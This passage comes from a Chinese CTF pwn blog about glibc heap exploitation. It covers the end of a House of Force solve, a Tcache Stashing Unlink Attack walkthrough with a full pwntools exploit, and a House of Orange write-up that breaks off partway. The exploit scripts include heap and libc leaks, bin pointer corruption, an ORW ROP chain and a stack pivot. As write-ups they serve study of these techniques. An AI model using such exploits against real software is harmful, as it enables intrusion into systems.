#chunk0（malloc(0x30)）0xe80030:\t0x6161616161616161\t0x61616161616161610xe80040:\t0x6161616161616161\t0x61616161616161610xe80050:\t0x6161616161616161\t0x61616161616161610xe80060:\t0x3131313131313131\t0xffffffffffffffa1 #old_top_chunk0xe80070:\t0x0000000000000000\t0x0000000000000000......（省略内容均为空）0xe800e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n此时已经可以控制goodbye_message的地址，覆盖后退出程序就可以触发magic函数。\ncreate(0x10,p64(magic)*2)\n\npwndbg&gt; x/30gx 0xe800000xe80000:\t0x0000000000000000\t0x0000000000000021 #现在已经被控制的chunk0xe80010:\t0x0000000000400d49\t0x0000000000400d49    \t\t#hello_message      #magic0xe80020:\t0x0000000000000000\t0x0000000000000039 #chunk0（malloc(0x30)）0xe80030:\t0x6161616161616161\t0x61616161616161610xe80040:\t0x6161616161616161\t0x61616161616161610xe80050:\t0x6161616161616161\t0x61616161616161610xe80060:\t0x3131313131313131\t0xffffffffffffffa1 #top_chunk0xe80070:\t0x0000000000000000\t0x0000000000000000......（省略内容均为空）0xe800e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\ndebug-exp➜  ~ cd Desktop/    '5.exit\\n'    '----------------------------\\n'    'Your choice:'[DEBUG] Sent 0x5 bytes:    'bbbb\\n'[DEBUG] Sent 0x2 bytes:    '2\\n'[DEBUG] Received 0x117 bytes:    'invaild choice!!!\\n'    '----------------------------\\n'    'Bamboobox Menu\\n'    '----------------------------\\n'    '1.show the items in the box\\n'    '2.add a new item\\n'    '3.change the item in the box\\n'    '4.remove the item in the box\\n'    '5.exit\\n'    '----------------------------\\n'    'Your choice:Please enter the length of item name:'[DEBUG] Sent 0x3 bytes:    '16\\n'[DEBUG] Received 0x1e bytes:    'Please enter the name of item:'[DEBUG] Sent 0x11 bytes:    00000000  49 0d 40 00  00 00 00 00  49 0d 40 00  00 00 00 00  │I·@·│····│I·@·│····│    00000010  0a                                                  │·│    00000011[DEBUG] Received 0x1d2 bytes:    '----------------------------\\n'    'Bamboobox Menu\\n'    '----------------------------\\n'    '1.show the items in the box\\n'    '2.add a new item\\n'    '3.change the item in the box\\n'    '4.remove the item in the box\\n'    '5.exit\\n'    '----------------------------\\n'    'Your choice:invaild choice!!!\\n'    '----------------------------\\n'    'Bamboobox Menu\\n'    '----------------------------\\n'    '1.show the items in the box\\n'    '2.add a new item\\n'    '3.change the item in the box\\n'    '4.remove the item in the box\\n'    '5.exit\\n'    '----------------------------\\n'    'Your choice:'[DEBUG] Sent 0x2 bytes:    '5\\n'[*] Switching to interactive mode----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:invaild choice!!!----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:[*] Process './bamboobox' stopped with exit code 0 (pid 29277)[DEBUG] Received 0x15 bytes:    'flag{house_of_force}\\n'flag{house_of_force}[*] Got EOF while reading in interactive$  \n\n可以看到已经打印出来了 flag\n","categories":["heap"],"tags":["House of 系列"]},{"title":"Tcache Stashing Unlink Attack（House of Lore）","url":"/2023/04/10/House%20of%20Lore/","content":"如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：\nTcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin\nHouse of Lore\nHouse of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。\n\nTcache Stashing Unlink Attack\n利用特性：1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中2.calloc函数分配堆块时不从tcache bin中选取。3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写\n\n利用前提\n1.能控制 Small Bin Chunk 的 bk 指针。2.程序可以越过Tache取Chunk。(使用calloc即可做到)3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。\n\n攻击目标\n向任意指定位置写入指定值。\n向任意地址分配一个Chunk。\n\n攻击前提\n能控制 Small Bin Chunk 的 bk 指针。\n程序可以越过Tache取Chunk。(使用calloc即可做到)\n程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。\n\n攻击原理我们首先分析House of Lore Attack中所忽视的Tcache相关代码。\n#if USE_TCACHE //如果程序启用了Tcache        /* While we're here, if we see other chunks of the same size,        stash them in the tcache.  */        //遍历整个smallbin，获取相同size的free chunk        size_t tc_idx = csize2tidx (nb);        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        {            mchunkptr tc_victim;            /* While bin not empty and tcache not full, copy chunks over.  */            //判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。            //验证取出的Chunk是否为Bin本身（Smallbin是否已空）            while ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count                   &amp;&amp; (tc_victim = last (bin) ) != bin)            {                //如果成功获取了Chunk                if (tc_victim != 0)                {                    // 获取 small bin 中倒数第二个 chunk 。                    bck = tc_victim-&gt;bk;                    //设置标志位                    set_inuse_bit_at_offset (tc_victim, nb);                    // 如果不是 main_arena，设置对应的标志                    if (av != &amp;main_arena)                        set_non_main_arena (tc_victim);                    //取出最后一个Chunk                    bin-&gt;bk = bck;                    bck-&gt;fd = bin;                    //将其放入到Tcache中                    tcache_put (tc_victim, tc_idx);                }            }        }#endif\n\n此处我们发现了一个很关键的情况！我们在此处没有经过House of Lore中必须经过的检查：\n// 检查 bck-&gt;fd 是不是 victim，防止伪造if ( __glibc_unlikely( bck-&gt;fd != victim ) )    malloc_printerr (\"malloc(): smallbin double linked list corrupted\");\n\n但是此处又有了矛盾的地方！\n首先，在引入Tcache后，Tcache中的Chunk拥有绝对优先权，我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。（除非Tcache已经处于FULL状态）\n然后，我们如果要在这里启动攻击，那么要求SmallBin中至少有两个Chunk(否则无法进入While中的if语句块)，同时要求Tcache处于非空状态。\n那样就产生了矛盾，导致这个漏洞看似无法利用。\n但是calloc函数有一个很有趣的特性，它不会从Tcache拿Chunk，因此可以越过第一条矛盾“不能越过Tcache从SmallBin中取出Chunk”。\n然后是Unsorted Bin的**last remainder**基址，当申请的Chunk大于Unsorted Bin中Chunk的大小且其为Unsorted Bin中的唯一Chunk时，该Chunk不会进入Tcache。\n同时，我们来分析tcache_put函数\nstatic __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as \"in the tcache\" so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}\n\n可以发现，tcache_put函数没有做任何的安全检查。\n那么，当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。\n例题 BUUCTF-[2020 新春红包题]3未开启canary保护，可能存在栈溢出\nmain函数程序实现四个功能，增，删，查，改，还有一个栈溢出的函数\nvoid __fastcall __noreturn main(char *a1, char **a2, char **a3){  char v3[268]; // [rsp+0h] [rbp-110h] BYREF  int v4; // [rsp+10Ch] [rbp-4h]  v4 = 0;  sub_11D5();  sub_1450();  sub_1269();  while ( 1 )  {    while ( 1 )    {      while ( 1 )      {        menu();        v4 = readd();        if ( v4 != 3 )          break;        a1 = v3;        edit(v3, a2);      }      if ( v4 &gt; 3 )        break;      if ( v4 == 1 )      {        if ( x1c &lt;= 0 )          exitt();        a1 = v3;        add(v3);        --x1c;      }      else      {        if ( v4 != 2 )          goto LABEL_19;        a1 = v3;        delete(v3);      }    }    if ( v4 == 5 )      exitt();    if ( v4 &lt; 5 )    {      a1 = v3;      show(v3);    }    else    {      if ( v4 != 666 )LABEL_19:        exitt();      stack_attack(a1, a2);    }  }}\n\nadd函数申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。\nint __fastcall sub_1515(__int64 a1){  int v2; // [rsp+10h] [rbp-20h]  int v3; // [rsp+14h] [rbp-1Ch]  unsigned int v4; // [rsp+18h] [rbp-18h]  int size; // [rsp+1Ch] [rbp-14h]  printf(\"Please input the red packet idx: \");  v4 = readd();  if ( v4 &gt; 0x10 )    exitt();  printf(\"How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): \");  v3 = readd();  if ( v3 == 2 )  {    size = 0xF0;  }  else if ( v3 &gt; 2 )  {    if ( v3 == 3 )    {      size = 0x300;    }    else    {      if ( v3 != 4 )        goto LABEL_14;      size = 0x400;    }  }  else  {    if ( v3 != 1 )    {LABEL_14:      size = 0;      goto LABEL_15;    }    size = 16;  }LABEL_15:  if ( size != 0x10 &amp;&amp; size != 0xF0 &amp;&amp; size != 0x300 &amp;&amp; size != 0x400 )    exitt();  *(16LL * v4 + a1) = calloc(1uLL, size);  *(a1 + 16LL * v4 + 8) = size;  printf(\"Please input content: \");  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));  if ( v2 &lt;= 0 )    exitt();  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;  return puts(\"Done!\");}\n\ndelete函数存在UAF\nint __fastcall delete(__int64 a1){  unsigned int v2; // [rsp+1Ch] [rbp-4h]  printf(\"Please input the red packet idx: \");  v2 = readd();  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )    exitt();  free(*(16LL * v2 + a1));                      // uaf                                                //   return puts(\"Done!\");}\n\nedit函数编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次\nint __fastcall sub_1740(__int64 a1, __int64 a2){  void *v2; // rsi  int v4; // [rsp+18h] [rbp-8h]  unsigned int v5; // [rsp+1Ch] [rbp-4h]  if ( qword_4010 &lt;= 0 )    exitt(a1, a2);  --qword_4010;  printf(\"Please input the red packet idx: \");  v5 = readd();  if ( v5 &gt; 0x10 || !*(16LL * v5 + a1) )    exitt(\"Please input the red packet idx: \", a2);  printf(\"Please input content: \");  v2 = *(16LL * v5 + a1);  v4 = read(0, v2, *(16LL * v5 + a1 + 8));  if ( v4 &lt;= 0 )    exitt(0LL, v2);  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;  return puts(\"Done!\");}\n\n\nshow函数int __fastcall sub_184E(__int64 a1){  unsigned int v2; // [rsp+1Ch] [rbp-4h]  printf(\"Please input the red packet idx: \");  v2 = readd();  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )    exitt();  puts(*(16LL * v2 + a1));  return puts(\"Done!\");}\n\n栈溢出函数执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。\nssize_t sub_13BD(){  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  if ( *(first_chunk + 2048) &lt;= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )    exitt();  puts(\"You get red packet!\");  printf(\"What do you want to say?\");  return read(0, buf, 0x90uLL);}\n\n思路因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。\n调试过程先把前面的写好\n# coding=utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug') sh = process('./RedPacket_SoEasyPwn1')#sh = remote('node4.buuoj.cn','27283')libc=ELF(\"./libc-2.29.so\")  s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims\t\t    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause() def add(index,chunk_size_index,value):    ru('Your input: ')    sl('1')    ru('Please input the red packet idx: ')    sl(str(index))    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')    sl(str(chunk_size_index))    ru('Please input content: ')    sl(value)def free(index):    ru('Your input: ')    sl('2')    ru('Please input the red packet idx: ')    sl(str(index))def edit(index,value):    ru('Your input: ')    sl('3')    ru('Please input the red packet idx: ')    sl(str(index))    ru('Please input content: ')    sl(value)def show(index):    ru('Your input: ')    sl('4')    ru('Please input the red packet idx: ')    sl(str(index))\n\n构造tcache bin首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个\n#1.0x10 2.0xf0 3.0x300 4.0x400for i in range(7):    add(15,4,'Chunk_15')    free(15)for i in range(6):    add(14,2,'Chunk_14')    free(14)dbg()\n\n此时我们利用UAF可以泄露出heap地址\nshow(15)last_chunk_addr = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00'))lg('last_chunk_addr',last_chunk_addr)heap_addr = last_chunk_addr - 0x26C0lg('heap_addr',heap_addr)dbg()\n\n\n利用unsorted bin构造两个small bin chunk\n当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。\n\n我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。\n申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。\nadd(1,4,'Chunk_1')add(13,3,'Chunk_13')dbg()\n\n我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址\nfree(1)show(1)libc_base = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00')) - 0x1E4CA0lg('libc_base',libc_base)dbg()\n\n申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100\nadd(13,3,'Chunk_13')dbg()\n\n\n在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk\nadd(13,3,'Chunk_13')dbg()\n\n利用同样方法再构造一个small bin chunk\nadd(2,4,'Chunk_2')add(13,4,'Chunk_13')#dbg()free(2)#dbg()add(13,3,'Chunk_13')add(13,3,'Chunk_13')dbg()\n\n\n并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0\n修改small bin chunk的bk指针为first_chunk+0x800payload='\\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)edit(2,payload)dbg()\n\n再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.\n\n构造ORW的ROP链放入堆块中先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40\npop_rdi_ret = libc_base + 0x0000000000026542pop_rsi_ret = libc_base + 0x0000000000026f9epop_rdx_ret = libc_base + 0x000000000012bda6file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容ROP_chain  = '/flag\\x00\\x00\\x00'\n\nopen(file_name_addr,0)\nROP_chain += p64(pop_rdi_ret)ROP_chain += p64(file_name_addr)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(0)ROP_chain += p64(libc_base+libc.symbols['open'])\n\nread(3,flag_addr,0x40)Read函数的第一个参数文件描述符从0开始累加，程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，这样在程序中，每打开一个文件，文件描述符值从3开始累加。我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件read函数第一个参数是3，就是在这个文件里读取数据。\nROP_chain += p64(pop_rdi_ret)ROP_chain += p64(3)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['read'])\n\nwrite(1,flag_addr,0x40)\nROP_chain += p64(pop_rdi_ret)ROP_chain += p64(1)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['write'])\n\n申请chunk，将ROP链写到chunk里\nadd(4,4,ROP_chain)dbg()\n\n\n栈迁移利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。\nleave_ret = libc_base + 0x0000000000058373ru('Your input: ')sl('666')ru('What do you want to say?')#栈迁移sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))itr()\n\nexp# coding=utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug') sh = process('./RedPacket_SoEasyPwn1')#sh = remote('node4.buuoj.cn','27283')libc=ELF(\"./libc-2.29.so\")  s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims\t\t    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause() def add(index,chunk_size_index,value):    ru('Your input: ')    sl('1')    ru('Please input the red packet idx: ')    sl(str(index))    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')    sl(str(chunk_size_index))    ru('Please input content: ')    sl(value)def free(index):    ru('Your input: ')    sl('2')    ru('Please input the red packet idx: ')    sl(str(index))def edit(index,value):    ru('Your input: ')    sl('3')    ru('Please input the red packet idx: ')    sl(str(index))    ru('Please input content: ')    sl(value)def show(index):    ru('Your input: ')    sl('4')    ru('Please input the red packet idx: ')    sl(str(index)) #1.0x10 2.0xf0 3.0x300 4.0x400for i in range(7):    add(15,4,'Chunk_15')    free(15)for i in range(6):    add(14,2,'Chunk_14')    free(14)#dbg()show(15)last_chunk_addr = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00'))lg('last_chunk_addr',last_chunk_addr)heap_addr = last_chunk_addr - 0x26C0lg('heap_addr',heap_addr)#dbg()add(1,4,'Chunk_1')add(13,3,'Chunk_13')#dbg()free(1)show(1)libc_base = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00')) - 0x1E4CA0lg('libc_base',libc_base)#dbg()#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100add(13,3,'Chunk_13')#dbg()#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunkadd(13,3,'Chunk_13')#dbg()#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunkadd(2,4,'Chunk_2')#申请一个chunk防止合并add(13,4,'Chunk_13')#dbg()free(2)#dbg()add(13,3,'Chunk_13')add(13,3,'Chunk_13')#dbg()payload='\\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)edit(2,payload)#dbg()add(3,2,'Chunk_3')lg('heap_addr',heap_addr)#dbg()#ORWpop_rdi_ret = libc_base + 0x0000000000026542pop_rsi_ret = libc_base + 0x0000000000026f9epop_rdx_ret = libc_base + 0x000000000012bda6file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容ROP_chain  = '/flag\\x00\\x00\\x00'#open(file_name_addr,0)ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(file_name_addr)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(0)ROP_chain += p64(libc_base+libc.symbols['open'])#read(3,flag_addr,0x40)#Read函数的第一个参数文件描述符从0开始累加，#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，#这样在程序中，每打开一个文件，文件描述符值从3开始累加。#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件#read函数第一个参数是3，就是在这个文件里读取数据。ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(3)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['read'])#write(1,flag_addr,0x40)ROP_chain += p64(pop_rdi_ret)ROP_chain += p64(1)ROP_chain += p64(pop_rsi_ret)ROP_chain += p64(flag_addr)ROP_chain += p64(pop_rdx_ret)ROP_chain += p64(0x40)ROP_chain += p64(libc_base+libc.symbols['write'])add(4,4,ROP_chain)#dbg()leave_ret = libc_base + 0x0000000000058373ru('Your input: ')sl('666')ru('What do you want to say?')#栈迁移sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))#dbg()itr()","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Orange","url":"/2023/04/10/House%20of%20Orange/","content":"House of orange前提题目中不存在 free 函数或其他释放堆块的函数。\n原理House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。\n利用方法1.篡改top chunk size（注意size需要对齐内存页）2.分配比top chunk size大的chunk。3.现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。\n\n注意：伪造top chunk size时，必须满足以下要求1.伪造的size必须要对齐到内存页。2.size要大于MINSIZE。3.size要小于之后申请的chunk size + MINISIZE。4.size的prev inuse位必须为1。5.malloc的大小不能大于mmap分配阈值。\n\n例题houseoforange_hitcon_2016保护全开，打开ida\nmain函数void __fastcall __noreturn main(const char *a1, char **a2, char **a3){  int choice; // eax  sub_1218();  while ( 1 )  {    while ( 1 )    {      menu();      choice = my_read(a1, a2);      if ( choice != 2 )        break;      show();    }    if ( choice &gt; 2 )    {      if ( choice == 3 )      {        edit();      }      else      {        if ( choice == 4 )        {          puts(\"give up\");          exit(0);        }LABEL_13:        a1 = \"Invalid choice\";        puts(\"Invalid choice\");      }    }    else    {      if ( choice != 1 )        goto LABEL_13;      add();    }  }}\n\nadd函数会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。\nint add(){  unsigned int size; // [rsp+8h] [rbp-18h]  int color; // [rsp+Ch] [rbp-14h]  _QWORD *v3; // [rsp+10h] [rbp-10h]  _DWORD *v4; // [rsp+18h] [rbp-8h]  if ( num2 &gt; 3u )                              // num开始为0，可利用add4次  {    puts(\"Too many house\");    exit(1);  }  v3 = malloc(0x10uLL);   //chunk_1  printf(\"Length of name :\");  size = my_read();  if ( size &gt; 0x1000 )    size = 0x1000;  v3[1] = malloc(size);     //chunk_2  if ( !v3[1] )  {    puts(\"Malloc error !!!\");    exit(1);  }  printf(\"Name :\");  my_read2((void *)v3[1], size);  v4 = calloc(1uLL, 8uLL);      //chunk_3  printf(\"Price of Orange:\");  *v4 = my_read();  ::color();  printf(\"Color of Orange:\");  color = my_read();  if ( color != 0xDDAA &amp;&amp; (color &lt;= 0 || color &gt; 7) )  {    puts(\"No such color\");    exit(1);  }  if ( color == 0xDDAA )    v4[1] = 0xDDAA;  else    v4[1] = color + 30;  *v3 = v4;  heap_array = v3;  ++num2;  return puts(\"Finish\");}\n\nshow函数int sub_EE6(){  int v0; // eax  int v2; // eax  if ( !heap_array )    return puts(\"No such house !\");  if ( *(_DWORD *)(*heap_array + 4LL) == 0xDDAA )  {    printf(\"Name of house : %s\\n\", (const char *)heap_array[1]);    printf(\"Price of orange : %d\\n\", *(unsigned int *)*heap_array);    v0 = rand();    return printf(\"\\x1B[01;38;5;214m%s\\x1B[0m\\n\", *((const char **)&amp;unk_203080 + v0 % 8));  }  else  {    if ( *(int *)(*heap_array + 4LL) &lt;= 30 || *(int *)(*heap_array + 4LL) &gt; 37 )    {      puts(\"Color corruption!\");      exit(1);    }    printf(\"Name of house : %s\\n\", (const char *)heap_array[1]);    printf(\"Price of orange : %d\\n\", *(unsigned int *)*heap_array);    v2 = rand();    return printf(\"\\x1B[%dm%s\\x1B[0m\\n\", *(unsigned int *)(*heap_array + 4LL), *((const char **)&amp;unk_203080 + v2 % 8));  }}\n\nedit函数存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次\nint sub_107C(){  _DWORD *v1; // rbx  unsigned int size; // [rsp+8h] [rbp-18h]  int v3; // [rsp+Ch] [rbp-14h]  if ( num &gt; 2u )                               // num开始为0，可利用edit3次    return puts(\"You can't upgrade more\");  if ( !heap_array )    return puts(\"No such house !\");  printf(\"Length of name :\");  size = my_read();  if ( size &gt; 0x1000 )    size = 4096;  printf(\"Name:\");                              // size由我们输入，存在溢出  my_read2((void *)heap_array[1], size);  printf(\"Price of Orange: \");  v1 = (_DWORD *)*heap_array;  *v1 = my_read();  color();  printf(\"Color of Orange: \");  v3 = my_read();  if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )  {    puts(\"No such color\");    exit(1);  }  if ( v3 == 0xDDAA )    *(_DWORD *)(*heap_array + 4LL) = 0xDDAA;  else    *(_DWORD *)(*heap_array + 4LL) = v3 + 30;  ++num;  return puts(\"Finish\");}\n\n分析程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。\n过程先把前面的写好\n# coding=utf-8from pwn import  * context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug binary = './houseoforange_hitcon_2016'  #sh = process(binary) #连接本地程序sh = remote('node4.buuoj.cn',26188) #连接远程程序elf = ELF(binary)     libc = ELF('../../libc-2.23.so--64')  #libc-2.23.so--64one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget[0] = 0x45216s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims  :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg=lambda address,data:log.success('%s: '%(address)+hex(data))#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()def add(size, content, price='2', color='1'):    ru(\"Your choice : \")    sl('1')    ru(\"Length of name :\")    sl(str(size))    ru(\"Name :\")    sh.send(content)    ru(\"Price of Orange:\")    sl(str(price))    ru(\"Color of Orange:\")    #1-7    sl(str(color))def show():    ru(\"Your choice : \")    sl('2')def edit(size, content, price='2', color='1'):    ru(\"Your choice : \")    sl('3')    ru(\"Length of name :\")    sl(str(size))    ru(\"Name:\")    sh.send(content)    ru(\"Price of Orange:\")    sl(str(price))    ru(\"Color of Orange:\")    #1-7    sl(str(color))\n\n修改top chunk随便申请一个chunk，然后利用edit函数，溢出修改topchunk\nadd(0x30,'aaaa\\n')dbg()payload = 'a' * 0x30 +p64(0) + 